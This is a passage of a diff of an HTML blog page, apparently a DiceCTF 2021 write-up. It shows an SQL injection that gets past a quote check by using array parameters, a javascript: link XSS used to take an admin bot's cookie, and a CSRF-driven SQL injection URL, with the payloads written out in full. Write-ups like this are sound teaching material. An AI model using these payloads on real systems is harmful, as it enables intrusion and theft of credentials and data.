 This means that if we try to inject single quotes ourselves to try a classic sqli payload such as <code> ' OR 1=1</code> in the <code>password</code> parameter, the app would reject it.</p>
 <p>However, what&rsquo;s important to note is the application&rsquo;s use of its <code>bodyParser</code>, which is operating on extended mode. If you&rsquo;ve seen my <a href="https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize">GoogleCTF Pasteurize writeup</a>, then you&rsquo;d probably know about the flexibility of extended mode and what that means for us here. To summarize, npm&rsquo;s <code>bodyParser</code> will use the <code>qs</code> library to parse request bodies when in extended mode. The <code>qs</code> library can parse a variety of different objects - not just strings - if they&rsquo;re formatted a certain way in the request. By default, the contents of the request body will be parsed as strings and treated as such - but if you give a request parameter and specify it to be parsed as an array (using <code>[]</code> notation), it will instead be parsed as an array.</p>
 <p>When the program parses through our input, looking for a single quote character, it will parse it differently according to its type. If our input is a string, the functionality of the program will iterate through each character in the string in search of a single quote. But if our input is an array, it will iterate through each element in the array, looking for an element that will exactly match a single quote. We can therefore bypass the single quote check by specifying our <code>password</code> parameter as an array. So, we just need to modify the request body accordingly.</p>
-<pre><code>username=admin&amp;password[]=test' OR 1=1--
+<pre tabindex="0"><code>username=admin&amp;password[]=test&#39; OR 1=1--
 </code></pre><p>Without the <code>[]</code> notation, the <code>'</code> char in our input would fail the check.</p>
 <h2 id="web-utils">Web Utils</h2>
 <p>The application appears to be a pastebin and also a URL shortener. We&rsquo;re provided the source as well, and what&rsquo;s interesting is to note how the application parses our input, which is treated as JSON.</p>
 <p>If we create a paste, there&rsquo;s a front-end script which runs a request to <code>/api/createPaste</code>, which stores our paste into a database.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">(<span style="color:#66d9ef">async</span> () =&gt; {
-
-  <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>) =&gt; {
-    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, <span style="color:#a6e22e">resolve</span>);
-  });
-
-  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;text-form&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">e</span>) =&gt; {
-    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;text-input&#39;</span>).<span style="color:#a6e22e">value</span>;
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/createPaste&#39;</span>, {
-      <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
-      <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
-        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
-      },
-      <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
-        <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span>
-      })
-    })).<span style="color:#a6e22e">json</span>();
-
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">error</span>) {
-      <span style="color:#66d9ef">return</span>;
-    }
-
-    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;output&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span>
-      <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">origin</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/view/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
-  });
-
-})();
-</code></pre></div><p>Similarly if we make a shortened link, there&rsquo;s a front-end script that will do the same thing, but instead to <code>/api/createLink</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, <span style="color:#a6e22e">resolve</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;text-form&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;text-input&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/createPaste&#39;</span>, {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span>
+</span></span><span style="display:flex;"><span>      })
+</span></span><span style="display:flex;"><span>    })).<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;output&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">origin</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/view/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><p>Similarly if we make a shortened link, there&rsquo;s a front-end script that will do the same thing, but instead to <code>/api/createLink</code>.</p>
 <p>This seems like a cut and clear xss, with a caveat: when we make a paste, our input is treated as a string and so we won&rsquo;t be able to inject anything in a string context. Luckily, we can make a link, which in the <code>view.html</code> module will set the <code>window.location</code> to whatever we specify. Here, we can potentially escape out of the string context and execute javascript. However, unluckily, if we try to make a link, the <code>/api/createLink</code> endpoint has an additional check not present in the paste endpoint:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">...
-
-  <span style="color:#a6e22e">fastify</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;createLink&#39;</span>, {
-    <span style="color:#a6e22e">handler</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">rep</span>) =&gt; {
-      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">generateUid</span>(<span style="color:#ae81ff">8</span>);
-      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#39;^https?://&#39;</span>);
-      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span>))
-        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rep</span>
-          .<span style="color:#a6e22e">code</span>(<span style="color:#ae81ff">200</span>)
-          .<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;application/json; charset=utf-8&#39;</span>)
-          .<span style="color:#a6e22e">send</span>({
-            <span style="color:#a6e22e">statusCode</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">200</span>,
-            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid URL&#39;</span>
-          });
-
-...
-</code></pre></div><p>If our data doesn&rsquo;t start with <code>https?://</code> then we recieve an error. So, ideally, we would want the freedom of <code>/api/createPaste</code> combined with the freedom of how <code>view.html</code> renders links.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fastify</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;createLink&#39;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">handler</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">rep</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">generateUid</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#39;^https?://&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rep</span>
+</span></span><span style="display:flex;"><span>          .<span style="color:#a6e22e">code</span>(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>          .<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;application/json; charset=utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>          .<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">statusCode</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">200</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid URL&#39;</span>
+</span></span><span style="display:flex;"><span>          });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>If our data doesn&rsquo;t start with <code>https?://</code> then we recieve an error. So, ideally, we would want the freedom of <code>/api/createPaste</code> combined with the freedom of how <code>view.html</code> renders links.</p>
 <p>We can combine the two by sending a POST request to <code>/api/createPaste</code>, but malform our request body to override the <code>type</code> parameter, which dictates whether our input is a paste or a link. Luckily, the request processing is done client-side, so we can freely add additional items into the JSON data.</p>
 <p>You can use Burpsuite or a browser that allows request editing to do this.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{<span style="color:#f92672">&#34;data&#34;</span>:<span style="color:#e6db74">&#34;javascript:alert(1);&#34;</span>, <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;link&#34;</span>}
-</code></pre></div><p>With this as our request body, we can retrieve the created &ldquo;paste/link&rdquo; id and visit the webpage to see that our code is correctly interpreted as javascript. We can report our &ldquo;paste/link&rdquo; to the admin bot and grab their cookie, which has the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;data&#34;</span>:<span style="color:#e6db74">&#34;javascript:alert(1);&#34;</span>, <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;link&#34;</span>}
+</span></span></code></pre></div><p>With this as our request body, we can retrieve the created &ldquo;paste/link&rdquo; id and visit the webpage to see that our code is correctly interpreted as javascript. We can report our &ldquo;paste/link&rdquo; to the admin bot and grab their cookie, which has the flag.</p>
 <h2 id="build-a-better-panel">Build a Better Panel</h2>
 <p>A derivative of another challenge called &ldquo;Build a Panel&rdquo;, but harder. The website is a &ldquo;widget&rdquo; panel, which appear to work using &ldquo;embedly&rdquo; cards. There&rsquo;s already an example of a panel from reddit. The challenge also gave us an admin bot to report URLs to, so this may be another xss challenge.</p>
 <p>&hellip;With a few caveats. First, the admin bot only visits sites matching the following regex: <code>^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$</code></p>
 <p>Second, the CSP in the application is pretty strict:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">default-src <span style="color:#e6db74">&#39;none&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; style-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; connect-src <span style="color:#e6db74">&#39;self&#39;</span> https://www.reddit.com/comments/;
-</code></pre></div><p>And so there are a few issues that would need to be addressed before &ldquo;Build a Better Panel&rdquo; can be solved. With that being said, I&rsquo;m pretty sure it&rsquo;s better to take a look at the first challenge, &ldquo;Build a Panel&rdquo;, first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>default-src <span style="color:#e6db74">&#39;none&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; style-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; connect-src <span style="color:#e6db74">&#39;self&#39;</span> https://www.reddit.com/comments/;
+</span></span></code></pre></div><p>And so there are a few issues that would need to be addressed before &ldquo;Build a Better Panel&rdquo; can be solved. With that being said, I&rsquo;m pretty sure it&rsquo;s better to take a look at the first challenge, &ldquo;Build a Panel&rdquo;, first.</p>
 <h3 id="build-a-panel">Build a Panel</h3>
 <p>The first challenge is roughly the same code but the admin bot doesn&rsquo;t have the same regex check. So, the solution for both challenges may involve much of the same steps.</p>
 <p>We can examine source and find this interesting function (also present in &ldquo;build a better panel&rdquo;):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/debug/add_widget&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
-
-    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">secret_token</span>){
-        <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;panelid&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetname&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetdata&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>;
-        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
-            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
-                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>);
-                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;something went wrong&#39;</span>);
-            }<span style="color:#66d9ef">else</span>{
-                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;success!&#39;</span>);
-            }
-        });
-    }<span style="color:#66d9ef">else</span>{
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-    }
-});
-</code></pre></div><p>The endpoint is a special admin api call that inserts a widget into the widget table. In order to prevent non-admins from accessing the functionality of this call, a token value extracted from the visitor&rsquo;s cookies are compared to some <code>secret_token</code> value, which presumably only the admin has. But we can still get unintentional access by tricking an admin into visiting this endpoint without them knowing - executing a CSRF attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/debug/add_widget&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">secret_token</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;panelid&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetname&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetdata&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;something went wrong&#39;</span>);
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;success!&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The endpoint is a special admin api call that inserts a widget into the widget table. In order to prevent non-admins from accessing the functionality of this call, a token value extracted from the visitor&rsquo;s cookies are compared to some <code>secret_token</code> value, which presumably only the admin has. But we can still get unintentional access by tricking an admin into visiting this endpoint without them knowing - executing a CSRF attack.</p>
 <p>Specifically, a CSRF attack to execute an SQL injection. Since the endpoint constructs a query to add a widget into the database, we need to format our CSRF attack to include an SQLi payload. So, what are we trying to do with the database to perform SQLi on?</p>
 <p>In the source exists another table, called &ldquo;flag&rdquo;:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`CREATE TABLE IF NOT EXISTS flag (
-</span><span style="color:#e6db74">    flag TEXT
-</span><span style="color:#e6db74">)`</span>;
-<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, [], (<span style="color:#a6e22e">err</span>) =&gt; {
-    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">err</span>){
-        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">innerQuery</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO flag SELECT &#39;dice{fake_flag}&#39;`</span>;
-        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">innerQuery</span>);
-    }<span style="color:#66d9ef">else</span>{
-        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Could not create flag table&#39;</span>);
-    }
-});
-</code></pre></div><p>So this is our SQLi target: we want to run rogue SQL commands through the <code>/admin/debug/add_widget</code> endpoint, to access the &ldquo;flag&rdquo; table. We have an input, now we just need an output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`CREATE TABLE IF NOT EXISTS flag (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    flag TEXT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)`</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, [], (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">err</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">innerQuery</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO flag SELECT &#39;dice{fake_flag}&#39;`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">innerQuery</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Could not create flag table&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>So this is our SQLi target: we want to run rogue SQL commands through the <code>/admin/debug/add_widget</code> endpoint, to access the &ldquo;flag&rdquo; table. We have an input, now we just need an output.</p>
 <p>Since the query parameters in the <code>/admin/debug/add_widget</code> endpoint are unsanitized, we inject SQL into there - specifically through the <code>panelId</code> query:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;, (SELECT * FROM flag), &#39;</span><span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;whatever&#34;</span><span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">&#39;);--
-</span></code></pre></div><p>So the final URL to report to admin is this:</p>
-<pre><code>https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=112ad5ea-5583-4818-be4b-d1eb03ac3002', (SELECT * FROM flag), '{&quot;type&quot;:&quot;whatever&quot;}');--&amp;widgetname=0&amp;widgetdata=0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;, (SELECT * FROM flag), &#39;</span><span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;whatever&#34;</span><span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">&#39;);--
+</span></span></span></code></pre></div><p>So the final URL to report to admin is this:</p>
+<pre tabindex="0"><code>https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=112ad5ea-5583-4818-be4b-d1eb03ac3002&#39;, (SELECT * FROM flag), &#39;{&#34;type&#34;:&#34;whatever&#34;}&#39;);--&amp;widgetname=0&amp;widgetdata=0
 </code></pre><p>And we just need to reload our panel and get the flag.</p>
 
     <img src="https://jamvie.net/images/DiceCTF2021_BAPFlag.png"  alt="sa256"  class="center"  style="border-radius: 8px;"  />
@@ -375,55 +375,55 @@ This means that if we try to inject single quotes ourselves to try a classic sql
 <h3 id="prototype-pollution-sans-__proto__">Prototype Pollution sans <code>__proto__</code></h3>
 <p>Let&rsquo;s return to &ldquo;Build A Better Panel&rdquo;.</p>
 <p>Reading through the source, something immediately catches my eye, in the <code>custom.js</code> file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mergableTypes</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;boolean&#39;</span>, <span style="color:#e6db74">&#39;string&#39;</span>, <span style="color:#e6db74">&#39;number&#39;</span>, <span style="color:#e6db74">&#39;bigint&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;undefined&#39;</span>];
-
